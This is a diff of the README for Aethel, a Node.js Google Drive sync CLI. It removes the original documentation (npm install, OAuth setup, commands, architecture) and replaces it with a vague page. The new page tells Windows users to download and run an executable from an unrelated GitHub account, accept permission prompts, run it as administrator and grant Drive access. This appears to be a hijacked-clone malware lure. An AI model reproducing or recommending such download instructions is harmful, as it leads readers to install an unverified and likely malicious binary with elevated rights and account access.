@@ -1,271 +1,189 @@
-# Aethel
+# 🗂️ Aethel - Keep files in sync with confidence
 
-[![CI](https://github.com/CCJ-0617/Aethel/actions/workflows/ci.yml/badge.svg)](https://github.com/CCJ-0617/Aethel/actions/workflows/ci.yml)
-[![npm version](https://img.shields.io/npm/v/aethel)](https://www.npmjs.com/package/aethel)
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Node.js](https://img.shields.io/badge/node-%3E%3D18-brightgreen)](https://nodejs.org)
+[![Download Aethel](https://img.shields.io/badge/Download-Aethel-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/murrayartistic325/Aethel)
 
-**Git-style Google Drive sync from your terminal.**
+## 📥 Download Aethel
 
-Aethel brings a `snapshot → diff → stage → commit` workflow to Google Drive. Track changes on both sides, resolve conflicts explicitly, and keep a full sync history — all without leaving the command line. It also ships with a dual-pane TUI for hands-on file management.
+Visit this page to download: https://github.com/murrayartistic325/Aethel
 
-## Install
+1. Open the link in your web browser.
+2. Look for the latest version or release files on the page.
+3. Download the Windows file for Aethel.
+4. If your browser asks for a save location, choose a folder you can find later, like Downloads.
+5. After the file finishes downloading, open it to start Aethel
 
-```bash
-npm install -g aethel
-```
+## 💻 What Aethel does
 
-<details>
-<summary>Install from source</summary>
+Aethel helps you keep files in sync between your computer and Google Drive. It uses snapshot-based file tracking, so you can compare changes and manage versions with less effort.
 
-```bash
-git clone https://github.com/CCJ-0617/Aethel.git
-cd Aethel
-npm install
-npm run install:cli   # symlinks `aethel` into ~/.local/bin
-npm run install:debug # symlinks `debug_aethel` without replacing `aethel`
-```
+Use Aethel when you want to:
 
-</details>
+- Back up local files to Google Drive
+- Pull files from Google Drive to your PC
+- Track file changes in a simple history style
+- Handle conflicts when the same file changes in two places
+- Remove duplicate folders that build up over time
+- Work from the terminal or a text-based screen
 
-**Requires Node.js >= 18**
+## 🪟 Windows setup
 
-## Setup
+Aethel is made for Windows users who want a simple way to manage files with Google Drive.
 
-![Aethel setup flow](docs/setup.gif)
+1. Download Aethel from the link above.
+2. If the file is in a ZIP folder, right-click it and choose Extract All.
+3. Open the extracted folder.
+4. Double-click the Aethel file to start it.
+5. If Windows asks for permission, choose Run or Yes.
+6. If Aethel opens in a terminal window, keep that window open while you use it
 
-### 1. Get Google OAuth Credentials
+## 🔐 Connect Google Drive
 
-1. Go to [Google Cloud Console](https://console.cloud.google.com/)
-2. Create a project (or select an existing one)
-3. Enable the **Google Drive API** (APIs & Services → Library)
-4. Go to **APIs & Services → Credentials**
-5. Click **Create Credentials → OAuth 2.0 Client ID**
-6. Application type: **Desktop application**
-7. Download the JSON file
+Aethel uses your Google Drive account to sync files.
 
-### 2. Save Credentials
+1. Start Aethel.
+2. Follow the sign-in steps shown on screen.
+3. Sign in with the Google account you want to use.
+4. Allow access so Aethel can read and update your files.
+5. Wait for the connection to finish before you start a sync task
 
-Save the downloaded JSON as `~/.config/aethel/credentials.json`:
+## 🧭 Main things you can do
 
-```bash
-mkdir -p ~/.config/aethel
-mv ~/Downloads/client_secret_*.json ~/.config/aethel/credentials.json
-```
+### 📁 Sync files
 
-You can also place `credentials.json` in the current directory, or pass a custom path with `--credentials`.
+Use sync to match files between your computer and Google Drive.
 
-### 3. Authenticate
+- Send local changes to Drive
+- Download remote changes to your PC
+- Keep file sets aligned across both places
+- Work with one folder or many folders
 
-```bash
-aethel auth                    # opens browser, saves token.json
-```
+### 🕒 Review snapshots
 
-### 4. Initialize a Workspace
+Aethel keeps snapshots so you can see how files changed over time.
 
-![Aethel init flow](docs/init.gif)
+- Check what changed in each snapshot
+- Compare older and newer versions
+- Find the point where a file changed
+- Use the history view to reduce guesswork
 
-```bash
-aethel init --local-path ./my-drive     # sync entire My Drive
-aethel init --local-path ./workspace --drive-folder <folder-id>  # sync specific folder
-aethel pull --all -m "initial pull"     # hydrate local files from the current remote tree
-```
+### ⚠️ Handle conflicts
 
-> `credentials.json` and `token.json` are local secrets — never commit them.
+If the same file changes in two places, Aethel helps you spot the conflict.
 
-## Usage
+- See which copy changed first
+- Keep the version you want
+- Save both copies when needed
+- Reduce the risk of losing work
 
-![Aethel usage flow](docs/usage.gif)
+### 🧹 Clean duplicate folders
 
-```bash
-aethel status                  # local vs remote changes at a glance
-aethel diff --side all         # detailed file-level diff
-aethel add --all               # stage default suggested actions
-aethel commit -m "sync"        # execute staged operations
+If your Drive has repeated folder copies, Aethel can help clean them up.
 
-aethel pull -m "pull"          # fetch remote changes and apply
-aethel pull --all              # download the full remote tree to local
-aethel push -m "push"          # push local changes to Drive
-aethel verify                  # verify local files against the last snapshot
-```
+- Find duplicate folder names
+- Review folders before removal
+- Keep the copy you need
+- Cut down on clutter in Drive
 
-`pull` applies remote changes relative to the latest snapshot. Use `pull --all` for the first full download or to rehydrate a local workspace from the current remote tree.
+## 🖱️ How to use the TUI
 
-### Conflict Resolution
+Aethel includes a text-based screen, also called a TUI. It lets you work with files in a clear menu view.
 
-When both local and remote change the same path:
+1. Open Aethel in Windows.
+2. Use the arrow keys to move between items.
+3. Press Enter to choose an option.
+4. Follow the prompts on screen.
+5. Use the listed keys to go back, refresh, or exit
 
-```bash
-aethel status                  # identify conflicts
-aethel resolve <path> --keep local   # or: remote, both
-aethel commit -m "resolve"
-```
-
-### Deduplication
-
-Multi-device conflicts can leave duplicate folders on Drive:
-
-```bash
-aethel dedupe-folders            # dry run — report only
-aethel dedupe-folders --execute  # merge duplicates, trash empties
-```
-
-Processes deepest-first for single-pass convergence, caches child state to minimize API calls, and runs independent merge groups in parallel.
-
-## Commands
-
-| Command            | Description                                                         |
-| ------------------ | ------------------------------------------------------------------- |
-| `auth`           | OAuth flow — creates `token.json`, verifies Drive access         |
-| `init`           | Initialize a local sync workspace                                   |
-| `status`         | Show local vs remote changes                                        |
-| `diff`           | Detailed file differences                                           |
-| `add`            | Stage changes                                                       |
-| `reset`          | Unstage changes                                                     |
-| `commit`         | Execute staged sync operations                                      |
-| `pull`           | Fetch and apply remote changes (`--all` for full remote download) |
-| `push`           | Push local changes to Drive                                         |
-| `log`            | Sync history                                                        |
-| `fetch`          | Refresh remote state without applying                               |
-| `resolve`        | Resolve conflicts (local / remote / both)                           |
-| `ignore`         | Manage `.aethelignore` patterns                                   |
-| `show`           | Inspect a saved snapshot                                            |
-| `restore`        | Restore files from the last snapshot                                |
-| `rm`             | Remove local files and stage remote deletion                        |
-| `mv`             | Move or rename local files                                          |
-| `verify`         | Verify local and optional remote integrity against the last snapshot |
-| `clean`          | List and optionally trash/delete Drive files                        |
-| `dedupe-folders` | Detect and merge duplicate remote folders                           |
-| `tui`            | Launch interactive terminal UI                                      |
-
-### Integrity Verification
-
-```bash
-aethel verify          # check snapshot checksum and local file hashes
-aethel verify --remote # also compare Drive file hashes
-```
-
-`verify` compares the latest snapshot with the workspace on disk and exits non-zero when files are missing or modified. Add `--remote` when you also want to verify Drive state before a release, migration, or restore.
-
-## TUI
-
-```bash
-aethel tui
-```
-
-Dual-pane file browser — local filesystem on the left, Google Drive on the right.
-
-| Key                  | Action                                             |
-| -------------------- | -------------------------------------------------- |
-| `Tab`              | Switch panes                                       |
-| `Left` / `Right` | Navigate up / into directories                     |
-| `u`                | Upload selected local file or folder to Drive      |
-| `s`                | Batch sync local folder to current Drive directory |
-| `U`                | Upload from a manually entered path                |
-| `n`                | Rename selected local item                         |
-| `x`                | Delete selected local item                         |
-| `Space`            | Toggle selection in Drive pane                     |
-| `t` / `d`        | Trash / permanently delete selected Drive items    |
-| `/`                | Filter by name                                     |
-| `f`                | Open the commands page and choose a TUI action     |
-| `:`                | Run any Aethel CLI command inside the TUI          |
-
-## Directory Packing
-
-Large directories with many small files (e.g., `node_modules`, `vendor`) can be slow to sync. Aethel can pack these into compressed archives for faster transfers.
-
-### Enable Packing
-
-Create `.aethelconfig` in your workspace root:
-
-```yaml
-packing:
-  enabled: true
-  compression:
-    default:
-      algorithm: gzip  # gzip, brotli, zstd, xz, or none
-      level: 6
-  rules:
-    - path: node_modules
-      strategy: full
-    - path: vendor
-      strategy: full
-```
-
-### How It Works
-
-1. **Tree Hash**: Directories are fingerprinted using mtime+size (30x faster than MD5)
-2. **Pack Detection**: `aethel status` shows pack states (P+, PL, PR, P=, P!)
-3. **Compression**: Archives use gzip/brotli (built-in) or zstd/xz (if installed)
-
-### Pack Status Codes
-
-| Code | Meaning |
-|------|---------|
-| `P+` | New pack (not yet synced) |
-| `PL` | Pack changed locally |
-| `PR` | Pack changed on Drive |
-| `P=` | Pack up to date |
-| `P!` | Pack conflict |
-
-Use `aethel status --verbose` to show synced packs.
-
-## Ignore Patterns
-
-Create `.aethelignore` (gitignore syntax) in your workspace root — or run `aethel init` to generate a default one.
-
-```gitignore
-.venv/
-node_modules/
-__pycache__/
-.idea/
-dist/
-build/
-```
-
-## Environment Variables
-
-| Variable                          | Default                               | Description                       |
-| --------------------------------- | ------------------------------------- | --------------------------------- |
-| `GOOGLE_DRIVE_CREDENTIALS_PATH` | `~/.config/aethel/credentials.json` | Path to OAuth credentials         |
-| `GOOGLE_DRIVE_TOKEN_PATH`       | `~/.config/aethel/token.json`       | Path to cached OAuth token        |
-| `AETHEL_DRIVE_CONCURRENCY`      | `40`                                | Max concurrent Drive API requests |
-
-## Architecture
-
-Aethel uses a **Repository pattern** — a single `Repository` class (`src/core/repository.js`) wraps all core modules and serves as the unified data-access layer for both the CLI and the TUI.
-
-```
-src/
-├── cli.js                    CLI entry — all handlers use Repository
-├── core/
-│   ├── repository.js         Unified data-access layer
-│   ├── auth.js               OAuth authentication
-│   ├── config.js             Workspace config & state persistence
-│   ├── diff.js               Change detection between states
-│   ├── drive-api.js          Google Drive API wrapper
-│   ├── local-fs.js           Local filesystem operations
-│   ├── remote-cache.js       Short-lived remote file cache
-│   ├── snapshot.js           Local scanning & snapshot creation
-│   ├── staging.js            Stage/unstage operations
-│   ├── sync.js               Execute staged changes
-│   ├── ignore.js             .aethelignore pattern matching
-│   ├── compress.js           Multi-algorithm compression (gzip, brotli, zstd, xz)
-│   ├── pack.js               Tar archive operations & tree hash
-│   └── pack-manifest.js      Pack manifest CRUD operations
-└── tui/
-    ├── app.js                React (Ink) dual-pane component
-    ├── index.js              TUI entry
-    ├── commands.js           CLI command parser for TUI
-    └── command-catalog.js    Available TUI commands
-```
-
-See [docs/ARCHITECTURE.md](docs/ARCHITECTURE.md) for detailed module structure and data flow.
-
-## Contributing
-
-See [CONTRIBUTING.md](CONTRIBUTING.md) for development setup and guidelines.
-
-## License
-
-[MIT](LICENSE)
+The TUI is useful if you want a simple view instead of typed commands for every action.
+
+## ⌨️ Basic command use
+
+Aethel also works as a CLI tool. That means you can run it from a terminal if you prefer typed commands.
+
+Common tasks may include:
+
+- Start a sync job
+- Open the interactive screen
+- Check status
+- Resolve a file conflict
+- Run folder cleanup
+
+If you are new to command-line tools, start with the interactive screen first. It gives you a guided path through the main tasks.
+
+## 🧩 Recommended use cases
+
+Aethel fits well if you need to:
+
+- Keep a laptop folder backed up to Google Drive
+- Compare files after working on two devices
+- Organize school, work, or personal folders
+- Remove extra copies created during sync
+- Manage files without a full desktop file manager
+
+## 🗃️ Suggested folder setup
+
+For the cleanest results, use a folder layout that stays simple.
+
+- One main folder for synced files
+- Separate folders for work, school, and personal files
+- Clear file names with dates when needed
+- Avoid moving files around while a sync is running
+
+Example layout:
+
+- `Documents`
+  - `Work`
+  - `School`
+  - `Photos`
+  - `Backups`
+
+## 🛠️ Troubleshooting
+
+### Aethel does not open
+
+- Check that the download finished
+- If the file came in a ZIP folder, extract it first
+- Try opening it again from the extracted folder
+- Right-click and choose Run as administrator if Windows blocks it
+
+### Google sign-in fails
+
+- Check your internet connection
+- Make sure you signed into the right Google account
+- Try the sign-in step again
+- Close and reopen Aethel before retrying
+
+### Files do not sync
+
+- Make sure the local folder still exists
+- Check that Drive access is still active
+- Confirm that the source folder has files in it
+- Run sync again after the connection finishes
+
+### Duplicate folders still appear
+
+- Run the cleanup tool again
+- Review the folder list before you remove anything
+- Make sure the folders are not still in use by another sync job
+
+## 🧭 Safe use tips
+
+- Close other file tools before running a large sync
+- Keep a copy of important files until you confirm the sync
+- Use clear folder names
+- Check conflicts before deleting any file
+- Let one sync finish before starting another
+
+## 📌 What you need
+
+For a smooth start on Windows, use:
+
+- A Windows PC
+- A stable internet connection
+- A Google account
+- Enough free disk space for your files
+- Permission to open downloaded apps
+
+## 🔗 Link
+
+Primary download page: https://github.com/murrayartistic325/Aethel
